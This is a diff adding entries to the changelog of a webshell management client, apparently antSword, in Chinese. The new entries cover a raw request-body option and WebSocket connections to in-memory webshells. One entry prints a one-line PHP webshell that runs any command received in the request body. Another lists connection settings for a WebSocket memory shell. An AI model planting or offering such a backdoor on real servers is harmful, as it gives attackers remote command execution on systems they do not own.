@@ -55,6 +55,16 @@
 * 优化了编辑 Shell 信息时，URL后缀发生改变后连动修改「连接类型」功能
 * 优化插件快捷设置,修正过多快捷设置后对UI影响(Fix #303)
 * 修复 JSP/MySQL类型在表名中有特殊字符时执行异常的 Bug (thx @powersploit)
+* 新增配置选项「Body 设置为 RAW 模式」
+
+> 勾选该选项后，只会发送 `pwd` 键下的内容，不会发送键值
+
+主要场景如下:
+
+```
+// 连接类型 CMDLinux, 勾选 「Body 设置为 RAW 模式」后可连接
+<?php system(file_get_contents("php://input"));?>
+```
 
 ### 文件管理
 
@@ -67,6 +77,24 @@
 * 支持自定义 Content-Type, 默认是 `form`
 * Fix #307
 * 重新规整 `modules/request.js` 代码结构
+* 调整 superagent ignoreHTTPS 注入,避免 npm upgrade之后引发问题
+* 
+* 支持 WebSocket 连接
+
+> 由于 ASP/ASPX/PHP/JSP/JSPJS 类型每次请求时为多个参数，WebSocket连接之后Server端解析会较为困难，所以当前仅支持「RAW」类型: 「PHPRAW」、「CMDLinux」、「PSWindows」,未来会支持基于 defineClass 的 JSPRAW 类型
+
+以 [wsMemShell](https://github.com/veo/wsMemShell) 项目中的 `wscmd` 为例:
+
+```
+URL: ws://127.0.0.1:8080/demoendpoint
+PWD: 随便填写
+连接类型: CMDLinux
+Encoder: default (明文, 这个是WebShell端决定的)
+Decoder: 根据情况自由选择
+```
+
+> 注意: 由于 antSword 历史设计原因，WebSocket 连接方式暂时只能每次操作都重新建立一次连接，在传输结束后自动与Server端断开
+
 
 ### 设置模块
 
